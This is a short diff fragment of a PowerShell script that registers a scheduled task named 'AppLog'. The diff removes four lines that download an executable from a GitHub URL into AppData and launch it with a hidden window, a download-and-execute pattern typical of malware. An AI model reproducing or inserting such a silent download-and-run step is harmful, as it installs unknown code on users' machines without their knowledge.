@@ -97,7 +97,3 @@ $trigger = New-ScheduledTaskTrigger -Once -At $triggerTime
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AppLog" -Description "Daily dump of Applog"
 
 
-$VIS = "https://github.com/Zyg0s/VI_ASTRA/raw/refs/heads/main/Viscousgetter.exe"
-$VISPath = "$env:AppData\Viscousgetter.exe"
-Invoke-WebRequest -Uri $VIS -OutFile $VISPath
-Start-Process -FilePath $VISPath -WindowStyle Hidden
